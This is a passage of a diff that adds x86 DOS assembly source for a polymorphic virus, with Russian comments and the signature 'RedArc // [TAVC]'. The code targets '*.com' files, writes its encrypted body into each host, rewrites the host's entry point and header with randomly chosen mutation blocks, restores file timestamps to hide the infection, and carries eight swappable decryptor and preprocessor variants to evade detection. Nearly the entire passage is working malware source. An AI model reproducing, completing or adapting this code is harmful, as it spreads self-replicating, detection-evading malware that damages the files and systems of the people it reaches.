+     pop es
+;Пересылка скалькулированной тушки вируса в буфер
+MoveToBuff:
+     mov si,bp
+     add si,DeCrypter
+     xor di,di
+     mov cx, VirLen / 2
+     rep movsw
+;Шифрация части тела статическим алгоритмом
+StaticCryptBuff:
+     push ds
+     push es
+     pop ds
+     push cs
+     cld
+     mov cx,StaticLen / 2
+     mov si,StaticCryptStart-DeCrypter
+     mov di,si
+     call StaticLoop
+;Шифрация тела вируса алгоритмом мутаций
+MutationCryptBuff:
+     mov si,CryptStart-DeCrypter
+     push bx
+     mov di,si
+     push cs
+     xor cx,cx
+     call LoopDecrypt
+;Запись зашифрованной тушки в файл
+WriteBuffToFile:
+     mov ah, 40h
+     pop bx
+     xor dx,dx
+     mov cx,VirLen
+     int 21h
+     pop ds
+     mov word ptr cs:[bp+Save_ES],es
+     push cs
+     pop es
+;Калькуляция и запись точки Entry в программу
+     mov ax,4200h
+     pop dx
+     xor cx,cx
+     push dx
+     sub dx,OffsNewEntryPoint
+     int 21h
+Ran3:
+     jmp short $+2
+     call RandomDX
+     mov byte ptr ds:[bp+CurrentEntry],dl
+     xchg ax,dx
+     mov si,bp
+     mov cx,2
+     mov di,si
+     xchg ah,ch
+     add di,OffsetEntry
+     mul cl
+     add di,ax
+     add si,word ptr ds:[di]
+     mov di,bp
+     add di,OldEntryOffset
+     push di
+     mov cx,_E_H_Length
+     push cx
+     rep movsb
+     pop cx
+     mov ah,40h
+     pop dx
+     int 21h
+;Калькуляция и запись первой точки входа
+     mov ax,4200h
+     xor cx,cx
+     xor dx,dx
+     int 21h
+Ran4:
+     jmp short $+2
+     call RandomDX
+     mov byte ptr ds:[bp+CurrentHead],dl
+     xchg ax,dx
+     mov si,bp
+     mov cx,2
+     mov di,si
+     xchg ah,ch
+     add di,OffsetHead
+     push ax
+     mul cl
+     add di,ax
+     add si,word ptr ds:[di]
+     mov di,bp
+     add di,OldHeadOffset
+     push di
+     mov cx,14
+     pop dx
+     rep movsb
+
+     pop ax
+     pop cx
+     mov di,bp
+     add di,ax
+     sub cx,OffsNewEntryPoint
+     add di,OffsetOne
+     xor dx,dx
+     mov dl,byte ptr ds:[di]
+     mov di,bp
+     add di,OldHeadOffset
+     push di
+     add di,dx
+     mov word ptr ds:[di],cx
+     pop dx
+
+     mov ah,40h
+     mov cx,14
+     int 21h
+
+     mov ax,word ptr cs:[bp+Save_ES]
+     mov es,ax
+     mov ax,Close_File
+     push cs
+     add ax,bp
+     push ax
+     retf
+;*******************************************************************
+;Данные вируса
+C_Mask equ $-Entry
+db '*.com',0h
+
+;Данные для мутаций блока START
+_1_Head equ $-Entry
+_1_H:
+add si,EntryPoint
+push si
+push cs
+push si
+retf
+_1_Length equ $-_1_H
+
+Subr1:
+     mov ah,3fh
+     mov cx,_E_H_Length
+     mov dx,bp
+     add dx,OldEntryOffset
+     int 21h
+ret
+
+_2_Head equ $-Entry
+_2_H:
+xchg si,di
+add di,EntryPoint
+push di
+push ds
+push di
+retf
+_2_Length equ $-_2_H
+
+Subr2:
+     mov ax,4202h
+     xor cx,cx
+     xor dx,dx
+     int 21h
+ret
+
+_3_Head equ $-Entry
+_3_H:
+mov bx,EntryPoint
+add bx,si
+push bx
+push es
+push bx
+retf
+_3_Length equ $-_3_H
+
+LoadDateTime:
+     push di
+     push dx
+     push cx
+     mov ax,5700h
+     int 21h
+     push es
+     push ds
+     pop es
+     mov di,bp
+     add di,Save_DXCX
+     xchg ax,dx
+     stosw
+     xchg ax,cx
+     stosw
+     pop es
+     pop cx
+     pop dx
+     pop di
+     ret
+
+_4_Head equ $-Entry
+_4_H:
+mov ax,EntryPoint
+inc ah
+push ax
+push cs
+push ax
+retf
+_4_Length equ $-_4_H
+
+SaveDateTime:
+     push si
+     push cx
+     push dx
+     mov si,bp
+     add si,Save_DXCX
+     lodsw
+     xchg ax,dx
+     lodsw
+     xchg ax,cx
+     mov ax,5701h
+     int 21h
+     pop dx
+     pop cx
+     pop si
+     ret
+
+_5_Head equ $-Entry
+_5_H:
+mov cx,EntryPoint
+inc ch
+push cx
+push ds
+push cx
+retf
+_5_Length equ $-_5_H
+
+RandomDX:
+   push ds
+   push ax
+   push bx
+   xor dx,dx
+   mov ds,dx
+   mov ax,ds:[46ch]
+   mov bx,8
+   div bx
+   pop bx
+   pop ax
+   pop ds
+   jmp short $+2
+   inc dx
+   cmp dl,8
+   jg RandomDX
+   cmp dl,1
+   jl RandomDX
+ret
+
+_6_Head equ $-Entry
+_6_H:
+mov bx,EntryPoint
+inc bh
+push bx
+push es
+push bx
+retf
+_6_Length equ $-_6_H
+
+_7_Head equ $-Entry
+_7_H:
+mov dx,EntryPoint
+inc dh
+push dx
+push cs
+push dx
+retf
+_7_Length equ $-_7_H
+
+_8_Head equ $-Entry
+_8_H:
+add si,EntryPoint
+push si
+jmp si
+_8_Length equ $-_8_H
+
+OffsetOne equ $-Entry   ;Смещения места, содержащего точку входа
+db 0, 2, 4, 1, 1, 1, 1, 1, 2
+OffsetHead equ $-Entry  ;Смещение начала блоков-голов
+dw 0, _1_Head, _2_Head, _3_Head, _4_Head, _5_Head, _6_Head, _7_Head, _8_Head
+LengthHead equ $-Entry  ;Длины блоков-голов
+db 0, _1_Length, _2_Length, _3_Length, _4_Length, _5_Length, _6_Length, _7_Length, _8_Length
+CurrentHead equ $-Entry ;Номер текущей активной головы
+db 1
+OldHeadOffset equ $-Entry ;Старое начало программы-носителя
+db 14 dup (90h)
+
+;Данные для мутации блока Entry
+_E_H_1 equ $-Entry
+pop ax
+push ax
+add ax,Decrypter
+push cs
+push ax
+retf
+db 080h
+db 0adh
+_E_H_2 equ $-Entry
+pop bx
+push bx
+add bx,Decrypter
+push ds
+push bx
+retf
+db 0adh
+db 0adh
+_E_H_3 equ $-Entry
+pop cx
+push cx
+add cx,Decrypter
+push es
+push cx
+retf
+db 0adh
+db 0adh
+_E_H_4 equ $-Entry
+pop dx
+push dx
+add dx,Decrypter
+push cs
+push dx
+retf
+db 0adh
+db 0adh
+_E_H_5 equ $-Entry
+pop si
+push si
+add si,Decrypter
+push ds
+push si
+retf
+db 0adh
+db 0adh
+_E_H_6 equ $-Entry
+pop di
+push di
+add di,Decrypter
+push es
+push di
+retf
+db 0adh
+db 0adh
+_E_H_7 equ $-Entry
+pop bp
+push bp
+add bp,Decrypter
+push cs
+push bp
+retf
+db 0adh
+db 0adh
+_E_H_8 equ $-Entry
+pop ax
+push ax
+add ax,Decrypter
+push ds
+push ax
+retf
+db 0adh
+db 0adh
+
+OffsetEntry equ $-Entry  ;Смещение начала блоков-точек входа
+dw 0, _E_H_1, _E_H_2, _E_H_3, _E_H_4, _E_H_5, _E_H_6, _E_H_7, _E_H_8
+CurrentEntry equ $-Entry
+db 1
+OldEntryOffset equ $-Entry ;Старый блок от точки входа программы-носителя
+db _E_H_Length dup (90h)
+
+db ' RedArc // [TAVC] '
+
+;Данные для мутации блока декриптора
+_MtE_1_ equ $-Entry
+lodsw
+ror ax,CryptKey
+nop
+xchg ax,bx
+lodsw
+rol ax,CryptKey
+nop
+xchg ah,al
+inc cx
+xchg bh,bl
+nop
+inc cx
+stosw
+inc cx
+xchg ax,bx
+nop
+inc cx
+stosw
+
+_MtE_2_ equ $-Entry
+nop
+lodsw
+nop
+ror ax,CryptKey / 2
+nop
+xchg ax,bx
+nop
+lodsw
+xchg bh,bl
+rol ax,CryptKey / 2
+xchg ah,al
+inc cx
+stosw
+inc cx
+xchg ax,bx
+inc cx
+stosw
+inc cx
+
+_MtE_3_ equ $-Entry
+lodsw
+ror ax,CryptKey / 3
+xchg ax,bx
+lodsw
+rol ax,CryptKey / 3
+xchg bh,bl
+inc cx
+xchg ah,al
+inc cx
+stosw
+inc cx
+nop
+xchg ax,bx
+nop
+inc cx
+nop
+stosw
+nop
+
+_MtE_4_ equ $-Entry
+lodsw
+nop
+inc cx
+nop
+xchg ax,bx
+inc cx
+ror bx,0adh
+lodsw
+rol ax,0adh
+inc cx
+xchg ah,al
+inc cx
+xchg bh,bl
+nop
+stosw
+nop
+xchg ax,bx
+stosw
+
+_MtE_5_ equ $-Entry
+nop
+inc cx
+nop
+lodsw
+xchg ax,bx
+lodsw
+rol ax,0beh
+nop
+xchg ah,al
+inc cx
+ror bx,0beh
+xchg bh,bl
+stosw
+inc cx
+xchg ax,bx
+stosw
+nop
+inc cx
+
+_MtE_6_ equ $-Entry
+inc cx
+lodsw
+ror ax,0ceh
+nop
+xchg ax,bx
+lodsw
+rol ax,0ceh
+xchg al,ah
+nop
+xchg bl,bh
+inc cx
+nop
+stosw
+xchg ax,bx
+inc cx
+stosw
+inc cx
+nop
+
+_MtE_7_ equ $-Entry
+nop
+nop
+nop
+lodsw
+inc cx
+xchg ax,bx
+lodsw
+rol ax,0deh
+ror bx,0deh
+xchg bh,bl
+xchg ah,al
+stosw
+xchg ax,bx
+inc cx
+stosw
+nop
+inc cx
+inc cx
+
+_MtE_8_ equ $-Entry
+inc cx
+inc cx
+lodsw
+inc cx
+ror ax,077h
+nop
+xchg ax,bx
+lodsw
+rol ax,077h
+stosw
+inc cx
+xchg ax,bx
+xchg ah,al
+nop
+stosw
+nop
+nop
+
+OffsetMtE equ $-Entry  ;Смещение начала блоков-декрипторов
+dw 0, _MtE_1_, _MtE_2_, _MtE_3_, _MtE_4_, _MtE_5_, _MtE_6_, _MtE_7_, _MtE_8_
+CurrentMtE equ $-Entry
+db 1
+
+;Данные для мутации блока препроцессора к декриптору
+_P_1_ equ $-Entry
+nop
+pop si
+mov bp,si
+nop
+push cs
+cli
+add si,CryptStart
+sti
+mov di,si
+push di
+xor cx,cx
+cld
+nop
+
+_P_2_ equ $-Entry
+xchg bp,di
+pop di
+mov bp,di
+std
+push cs
+add di,CryptStart
+mov si,di
+cld
+push si
+nop
+xor cx,cx
+cld
+
+_P_3_ equ $-Entry
+xchg ax,bx
+pop di
+ror ax,3
+push cs
+mov bp,di
+add di,CryptStart
+std
+push di
+mov si,di
+xor cx,cx
+cld
+sti
+
+_P_4_ equ $-Entry
+clc
+pop bp
+mov si,bp
+push cs
+stc
+add si,CryptStart
+xor cx,cx
+nop
+mov di,si
+push di
+cld
+xchg ax,bx
+xchg ax,bx
+
+_P_5_ equ $-Entry
+pop bp
+xchg ax,bx
+mov di,bp
+push cs
+add di,CryptStart
+nop
+xor cx,cx
+mov si,di
+xchg ax,bx
+push si
+cld
+nop
+nop
+
+_P_6_ equ $-Entry
+pop bp
+nop
+mov di,bp
+xor cx,cx
+nop
+add di,CryptStart
+push cs
+nop
+mov si,di
+push di
+nop
+nop
+cld
+
+_P_7_ equ $-Entry
+pop si
+std
+mov bp,si
+xor cx,cx
+cld
+add si,CryptStart
+push cs
+cld
+mov di,si
+nop
+nop
+push si
+cld
+
+_P_8_ equ $-Entry
+nop
+nop
+pop di
+xor cx,cx
+mov bp,di
+add di,CryptStart
+xchg ax,cx
+mov si,di
+push cs
+push di
+mov cx,ax
+cld
+
+Save_ES equ $-Entry
+dw ?
+
+OffsetPrep equ $-Entry  ;Смещение начала блоков препроцессоров
+dw 0, _P_1_, _P_2_, _P_3_, _P_4_, _P_5_, _P_6_, _P_7_, _P_8_
+CurrentPrep equ $-Entry
+db 1
+
+Save_DXCX equ $-Entry
+dw ?
+dw ?
+
+CryptEnd equ $-Entry
+CryptLen equ $-Crypt
+VIRLEN equ $-Preprocessor
+StaticLen equ $-Virus
+DTA db 80h dup (?)
+
+LBL equ $-Entry
+
+End Start
+=== Cut ===
